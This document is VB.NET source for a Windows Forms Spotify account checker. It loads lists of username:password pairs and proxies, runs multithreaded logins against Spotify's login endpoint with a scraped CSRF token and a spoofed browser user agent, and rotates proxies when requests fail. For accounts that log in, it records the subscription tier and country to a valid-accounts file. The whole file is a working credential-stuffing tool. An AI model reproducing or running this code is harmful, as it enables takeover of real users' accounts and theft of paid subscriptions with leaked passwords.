Imports System.ComponentModel
Imports System.IO
Imports System.Text.RegularExpressions
Imports System.Threading
Imports xNet

Public Class Form1
    Private point_0 As Point

    Public string_0 As String()

    Public string_1 As String()

    Public string_2 As String() = New String(-1) {}

    Public string_3 As String() = New String(-1) {}

    Public int_0 As Integer

    Public int_1 As Integer

    Public int_2 As Integer

    Public int_3 As Integer

    Public int_4 As Integer

    Public int_5 As Integer

    Public int_6 As Integer

    Public int_7 As Integer

    Public object_0 As Object = New Object()

    Public thread_0 As Thread()

    Public proxyType_0 As ProxyType

    Public random_0 As Random = New Random()

    Public queue_0 As Queue

    Private icontainer_0 As IContainer

    Private string_4 As String = "Results"

    Private string_5 As String = ""
    Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Me.text_proxyType.SelectedIndex = 0
    End Sub
    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        End
    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
        WindowState = FormWindowState.Minimized
    End Sub
    Private Sub panel1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles Panel1.MouseDown
        Me.point_0 = e.Location
    End Sub

    Private Sub label1_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles Panel1.MouseMove
        If (e.Button = MouseButtons.Left) Then
            Dim left As Form1 = Me
            left.Left = left.Left + (e.X - Me.point_0.X)
            Dim top As Form1 = Me
            top.Top = top.Top + (e.Y - Me.point_0.Y)
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog()
        Try
            openFileDialog.Filter = "Text files | * .txt"
            If (openFileDialog.ShowDialog() = DialogResult.OK) Then
                Me.string_1 = File.ReadAllLines(openFileDialog.FileName).Distinct().ToArray()
                Me.int_1 = CInt(Me.string_1.Length)
                Me.Label6.Text = Me.int_1.ToString()
            End If
        Finally
            If (openFileDialog IsNot Nothing) Then
                DirectCast(openFileDialog, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog()
        Try
            openFileDialog.Filter = "Text files | * .txt"
            If (openFileDialog.ShowDialog() = DialogResult.OK) Then
                Dim str As String = File.ReadAllText(openFileDialog.FileName).Replace(";", ":")
                Dim chrArray() As Char = {Strings.ChrW(10)}
                Me.string_0 = str.Split(chrArray).Distinct().ToArray()
                Me.int_0 = CInt(Me.string_0.Length)
                Me.int_6 = Me.int_0
                Me.text_lost.Text = Me.int_0.ToString()
                text_checked.Text = Me.int_0.ToString()
            End If
        Finally
            If (openFileDialog IsNot Nothing) Then
                DirectCast(openFileDialog, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        Me.string_5 = DateTime.Now.ToString("dd-MM-yy HH-mm-ss")
        Me.string_4 = String.Concat("Results\Result ", Me.string_5)
        If (Me.int_0 = 0) Then
            MessageBox.Show("Load Accounts.")
        ElseIf (Me.int_1 <> 0) Then
            Select Case Me.text_proxyType.SelectedIndex
                Case 0
                    Me.proxyType_0 = ProxyType.Http
                    Exit Select
                Case 1
                    Me.proxyType_0 = ProxyType.Socks4
                    Exit Select
                Case 2
                    Me.proxyType_0 = ProxyType.Socks5
                    Exit Select
                Case Else
                    MessageBox.Show("Choose Proxy type")
                    Return
            End Select
            Me.int_2 = 0
            Me.int_3 = 0
            Me.string_2 = Nothing
            Me.string_3 = Nothing
            Me.int_5 = 0
            Me.int_7 = 0
            Me.int_6 = Me.int_0
            Me.queue_0 = New Queue()
            Directory.CreateDirectory(Me.string_4)
            Dim num As Integer = 0
            While num < Me.int_0
                Me.queue_0.Enqueue(Me.string_0(num))
                num = num + 1
            End While
            Me.int_4 = Convert.ToInt32(TextBox1.Text)
            ReDim Me.thread_0(Me.int_4 - 1)
            Dim num1 As Integer = 0
            While num1 < Me.int_4
                Me.thread_0(num1) = New Thread(New ThreadStart(AddressOf Me.method_5))
                Me.thread_0(num1).IsBackground = True
                Me.thread_0(num1).Start()
                num1 = num1 + 1
            End While
            Me.Timer1.Enabled = True
        Else
            MessageBox.Show("Load Proxies.")
        End If
    End Sub
    Public Sub method_5()
        Dim chrArray As Char()
        Dim str As String
        Dim str1 As String
        Dim string1 As String = Me.string_1(Me.random_0.[Next](0, Me.int_1))
        While Me.queue_0.Count > 0
            Dim object0 As Object = Me.object_0
            SyncLock object0
                Dim str2 As String = Me.queue_0.Peek().ToString()
                chrArray = New Char() {Strings.ChrW(13)}
                str = str2.TrimEnd(chrArray).Trim()
                Me.queue_0.Dequeue()
            End SyncLock
            chrArray = New Char() {":"c}
            Dim strArrays As String() = str.Split(chrArray)
            Try
                Dim httpRequest As xNet.HttpRequest = New xNet.HttpRequest()
                Try
                    httpRequest.Proxy = ProxyClient.Parse(Me.proxyType_0, string1)
                    httpRequest.Cookies = New CookieDictionary(False)
                    httpRequest.IgnoreProtocolErrors = True
                    httpRequest.AllowAutoRedirect = True
                    httpRequest.KeepAlive = True
                    httpRequest.UserAgent = Http.ChromeUserAgent()
                    Dim str3 As String = httpRequest.[Get]("https://accounts.spotify.com/en/login", Nothing).Cookies.ToString()
                    httpRequest.AddParam("csrf_token", str3.Replace("csrf_token=", ""))
                    httpRequest.AddHeader("cookie", String.Concat(str3, "; __bon=MHwwfDEyMDI2MzkyMTd8NTA1MTA4NDcxMTR8MXwxfDF8MQ==;"))
                    httpRequest.AddParam("username", strArrays(0))
                    httpRequest.AddParam("password", strArrays(1))
                    httpRequest.AddParam("remember", "true")
                    If (Not httpRequest.Post("https://accounts.spotify.com/api/login").ToString().Contains("displayName")) Then
                        object0 = Me.object_0
                        SyncLock object0
                            Me.int_3 = Me.int_3 + 1
                        End SyncLock
                        Me.int_5 = Me.int_5 + 1
                        Me.int_6 = Me.int_6 - 1
                    Else
                        Dim str4 As String = httpRequest.[Get]("https://www.spotify.com/us/account/overview/", Nothing).ToString()
                        Dim str5 As String = Form1.smethod_0(str4, "class=""product-name"">", "</h3>")
                        Dim str6 As String = Form1.smethod_0(str4, "id=""card-profile-country"">", "</p>")
                        If (str5.Contains("Spotify Free")) Then
                            str1 = "Spotify Free"
                        ElseIf (Not str5.Contains("Spotify Premium")) Then
                            str1 = If(Not str5.Contains("Premium for Family"), "_", "Premium for Family")
                        Else
                            str1 = "Spotify Premium"
                        End If
                        object0 = Me.object_0
                        SyncLock object0
                            Array.Resize(Of String)(Me.string_2, Me.int_2 + 1)
                            Dim string2 As String() = Me.string_2
                            Dim int2 As Integer = Me.int_2
                            Dim strArrays1() As String = {str, " => Subscription: ", str1, " Country: ", str6}
                            string2(int2) = String.Concat(strArrays1)
                            Me.int_2 = Me.int_2 + 1
                            Me.int_5 = Me.int_5 + 1
                            Me.int_6 = Me.int_6 - 1
                        End SyncLock
                    End If
                Finally
                    If (httpRequest IsNot Nothing) Then
                        DirectCast(httpRequest, IDisposable).Dispose()
                    End If
                End Try
            Catch
                Me.int_7 = Me.int_7 + 1
                Me.queue_0.Enqueue(str)
                string1 = Me.string_1(Me.random_0.[Next](0, Me.int_1))
            End Try
        End While
        If (Me.int_5 = Me.int_0) Then
            Me.method_6()
        End If
    End Sub
    Public Sub method_6()
        Dim num As Integer = 0
        While num < Me.int_4
            Me.thread_0(num) = New Thread(New ThreadStart(AddressOf Me.method_5))
            Me.thread_0(num).IsBackground = True
            Me.thread_0(num).Abort()
            num = num + 1
        End While
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.text_goods.Text = Me.int_2.ToString()
        Me.text_bads.Text = Me.int_3.ToString()
        Me.text_checked.Text = Me.int_5.ToString()
        Me.text_lost.Text = Me.int_6.ToString()
        Me.text_total_errors.Text = Me.int_7.ToString()
        If (Me.int_2 <> Me.textbox_goods.Lines.Count()) Then
            Me.textbox_goods.Lines = Me.string_2
            File.WriteAllLines(String.Concat(Me.string_4, "\Valid_accounts.txt"), Me.string_2)
        End If
    End Sub
    Public Shared Function smethod_0(ByVal string_6 As String, ByVal string_7 As String, ByVal string_8 As String) As String
        Dim value As String = Regex.Match(string_6, String.Concat(string_7, "(.*?)", string_8)).Groups(1).Value
        Return value
    End Function

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Try
            If Button4.Text = "Show Result" Then
                Me.Size = New Size(900, 244)
                Button4.Text = "Hide Result"
                Label2.Location = New Point(874, 5)
                Label3.Location = New Point(855, 3)
            ElseIf Button4.Text = "Hide Result" Then
                Me.Size = New Size(415, 244)
                Button4.Text = "Show Result"
                Label2.Location = New Point(396, 6)
                Label3.Location = New Point(377, 4)
            End If

        Catch ex As Exception

        End Try
    End Sub

End Class

